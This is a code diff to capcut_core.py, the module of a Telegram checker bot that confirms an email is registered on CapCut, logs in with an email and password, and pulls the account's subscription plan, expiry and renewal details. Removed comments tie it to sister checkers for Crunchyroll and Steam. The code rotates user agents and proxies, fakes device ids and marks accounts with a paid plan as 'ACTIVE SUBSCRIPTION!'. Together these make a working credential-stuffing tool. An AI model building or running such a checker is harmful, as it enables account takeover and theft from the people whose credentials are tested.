@@ -1,8 +1,4 @@
 # capcut_core.py  —  Bot-only edition
-# Drop-in core for the Telegram checker bot.
-# No terminal output, no ANSI, no argparse.
-# Usage: from capcut_core import check_capcut
-
 import json
 import random
 import re
@@ -13,10 +9,6 @@ from urllib.parse import quote
 import requests
 import urllib3
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
-
-# ─────────────────────────────────────────────
-#  Constants
-# ─────────────────────────────────────────────
 
 _USER_AGENTS = [
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
@@ -63,6 +55,50 @@ _PROXY_ERRORS = (
     requests.exceptions.ReadTimeout,
 )
 
+# ─────────────────────────────────────────────
+#  Normalizers
+# ─────────────────────────────────────────────
+
+_CYCLE_MAP = {
+    "month":     "Monthly",
+    "monthly":   "Monthly",
+    "1":         "Monthly",
+    "year":      "Yearly",
+    "yearly":    "Yearly",
+    "annual":    "Yearly",
+    "12":        "Yearly",
+    "week":      "Weekly",
+    "weekly":    "Weekly",
+    "lifetime":  "Lifetime",
+    "forever":   "Lifetime",
+    "quarter":   "Quarterly",
+    "quarterly": "Quarterly",
+    "3":         "Quarterly",
+    "half":      "Semi-Annual",
+    "6":         "Semi-Annual",
+}
+
+def _normalize_cycle(raw) -> str:
+    if not raw:
+        return "N/A"
+    return _CYCLE_MAP.get(str(raw).lower().strip(), str(raw).title())
+
+
+_RENEWAL_MAP = {
+    "auto":     "Auto-Renew ✅",
+    "un-auto":  "Non-Renewing ❌",
+    "un_auto":  "Non-Renewing ❌",
+    "manual":   "Manual",
+    "lifetime": "Lifetime ♾️",
+    "gift":     "Gift 🎁",
+    "trial":    "Free Trial",
+}
+
+def _normalize_renewal(raw) -> str:
+    if not raw:
+        return "N/A"
+    return _RENEWAL_MAP.get(str(raw).lower().strip(), str(raw).upper())
+
 
 # ─────────────────────────────────────────────
 #  Helpers
@@ -89,7 +125,6 @@ def _days_left(date_str: str) -> int:
 
 
 def _fetch_verify_fp(session: requests.Session, ua: str) -> str:
-    """Fetch a fresh verifyFp token from CapCut's login page."""
     try:
         resp = session.get(
             "https://www.capcut.com/login",
@@ -123,14 +158,9 @@ class CapCutChecker:
         self.store_country = "us"
         self.did = _generate_did()
         self.verify_fp = _fetch_verify_fp(self.session, self.ua)
+        self.user_id = ""
 
     def run_check(self) -> dict:
-        """
-        Returns a result dict with keys:
-          email, password, success, message,
-          plan, expiry, days_left, renewal, billing_cycle,
-          region, country
-        """
         base = {
             "email":         self.email,
             "password":      self.password,
@@ -143,6 +173,12 @@ class CapCutChecker:
             "billing_cycle": "N/A",
             "region":        "N/A",
             "country":       "N/A",
+            # Extra extracted fields
+            "start_date":    "N/A",
+            "product_name":  "N/A",
+            "platform":      "N/A",
+            "is_trial":      False,
+            "status":        "N/A",
         }
 
         if not self._check_email():
@@ -157,15 +193,28 @@ class CapCutChecker:
             base["message"] = "Failed to fetch subscription"
             return base
 
-        if base["plan"] not in ("FREE", "N/A"):
-            base["success"] = True
-            base["message"] = "ACTIVE SUBSCRIPTION!"
-        else:
+        plan     = base.get("plan", "FREE")
+        days     = base.get("days_left", "N/A")
+
+        is_expired = isinstance(days, int) and days < 0
+        is_free    = plan in ("FREE", "N/A", "free", "")
+
+        if is_free:
             base["success"] = False
             base["message"] = "Valid account — no paid plan"
+            base["status"]  = "FREE"
+        elif is_expired:
+            base["success"] = False
+            base["message"] = f"Plan expired {abs(days)} days ago"
+            base["status"]  = "EXPIRED"
+        else:
+            base["success"] = True
+            base["message"] = "ACTIVE SUBSCRIPTION!"
+            base["status"]  = "ACTIVE"
+
         return base
 
-    # ── Step 1 ────────────────────────────────────────────────────────
+    # ── Step 1 ─────────────────────────────────────────────────────
 
     def _check_email(self) -> bool:
         url = "https://login-row.www.capcut.com/passport/web/user/check_email_registered"
@@ -198,7 +247,7 @@ class CapCutChecker:
         except Exception:
             return False
 
-    # ── Step 2 ────────────────────────────────────────────────────────
+    # ── Step 2 ─────────────────────────────────────────────────────
 
     def _login(self) -> bool:
         url = "https://login-row.www.capcut.com/passport/web/email/login/"
@@ -236,17 +285,17 @@ class CapCutChecker:
                 self.cookies = dict(self.session.cookies)
                 try:
                     rj = resp.json()
-                    self.user_id = rj.get("data", {}).get("user_id", "")
+                    self.user_id = str(rj.get("data", {}).get("user_id", ""))
                 except Exception:
                     pass
-                if "store-country-code" in self.cookies:
-                    self.store_country = self.cookies["store-country-code"]
+                if "store-country-code" in self.session.cookies:
+                    self.store_country = self.session.cookies["store-country-code"]
                 return True
             return False
         except Exception:
             return False
 
-    # ── Step 3 ────────────────────────────────────────────────────────
+    # ── Step 3 ─────────────────────────────────────────────────────
 
     def _get_subscription(self, result: dict) -> bool:
         url = "https://commerce-api-sg.capcut.com/commerce/v1/subscription/user_info"
@@ -281,10 +330,14 @@ class CapCutChecker:
                 return False
 
             rj = resp.json()
+
+            # Debug: log full response so you can find new fields
+            print(f"[CapCut DEBUG] full response: {json.dumps(rj)[:2000]}")
+
             if str(rj.get("ret")) != "0":
                 return False
 
-            data = rj.get("data", {})
+            data       = rj.get("data", {})
             vip_levels = data.get("vip_levels", [])
 
             response_data: dict = {}
@@ -294,37 +347,79 @@ class CapCutChecker:
             except Exception:
                 pass
 
+            # ── Plan + extra fields ────────────────────────────────
+            raw_cycle   = ""
+            raw_renewal = ""
+            start_ts    = 0
+            end_ts      = 0
+
             if vip_levels:
-                plan = vip_levels[0].get("level", "free").upper()
+                vl = vip_levels[0]
+                raw_plan = vl.get("level") or vl.get("name") or "VIP"
+                result["plan"]         = raw_plan.upper()
+                result["product_name"] = vl.get("product_name") or vl.get("name") or raw_plan
+                result["platform"]     = vl.get("platform") or vl.get("pay_channel") or "N/A"
+                result["is_trial"]     = bool(vl.get("is_trial", False))
+
+                # Billing — try multiple possible keys
+                raw_cycle = (
+                    vl.get("cycle_unit")
+                    or vl.get("billing_cycle")
+                    or vl.get("period")
+                    or vl.get("cycle")
+                    or data.get("cycle_unit")
+                    or ""
+                )
+                raw_renewal = (
+                    vl.get("subscribe_type")
+                    or vl.get("renewal_type")
+                    or data.get("subscribe_type")
+                    or ""
+                )
+                start_ts = vl.get("start_time") or data.get("start_time", 0)
+                end_ts   = vl.get("end_time")   or data.get("end_time", 0)
+
             elif response_data and response_data.get("flag"):
-                plan = response_data.get("level", "VIP").upper()
+                result["plan"] = response_data.get("level", "VIP").upper()
+                raw_cycle      = response_data.get("cycle_unit", "") or response_data.get("period", "")
+                raw_renewal    = response_data.get("subscribe_type", "")
+                start_ts       = response_data.get("start_time", 0)
+                end_ts         = response_data.get("end_time", 0)
+
             else:
-                plan = "FREE"
+                result["plan"] = "FREE"
+                raw_cycle      = data.get("cycle_unit", "")
+                raw_renewal    = data.get("subscribe_type", "")
+                start_ts       = data.get("start_time", 0)
+                end_ts         = data.get("end_time", 0)
 
-            result["plan"]          = plan
-            result["billing_cycle"] = data.get("cycle_unit", "N/A")
-            result["renewal"]       = data.get("subscribe_type", "N/A").upper()
+            result["billing_cycle"] = _normalize_cycle(raw_cycle)
+            result["renewal"]       = _normalize_renewal(raw_renewal)
 
-            end_time = data.get("end_time", 0) or response_data.get("end_time", 0)
-            if end_time:
-                expiry = _format_timestamp(end_time)
+            if start_ts:
+                result["start_date"] = _format_timestamp(start_ts)
+
+            if end_ts:
+                expiry              = _format_timestamp(end_ts)
                 result["expiry"]    = expiry
                 result["days_left"] = _days_left(expiry)
             else:
-                result["expiry"]    = "No Expiry (Free)"
+                result["expiry"]    = "No Expiry" if result["plan"] not in ("FREE", "N/A") else "N/A"
                 result["days_left"] = "N/A"
 
             country_code        = self.cookies.get("store-country-code", "US").upper()
             result["region"]    = country_code
             result["country"]   = COUNTRY_MAP.get(country_code, country_code)
+
             return True
 
-        except Exception:
+        except Exception as e:
+            print(f"[CapCut] subscription error: {e}")
             return False
 
 
 # ─────────────────────────────────────────────
-#  Public API — drop-in for bot import
+#  Public API
 # ─────────────────────────────────────────────
 
 def check_capcut(
@@ -333,10 +428,6 @@ def check_capcut(
     proxy: str | None = None,
     stop_event=None,
 ) -> dict:
-    """
-    Bot-facing entry point. Matches the same signature as check_crunchyroll,
-    check_steam, etc. so it slots into the existing checker dispatch table.
-    """
     if stop_event and stop_event.is_set():
         raise InterruptedError("Stopped")
 
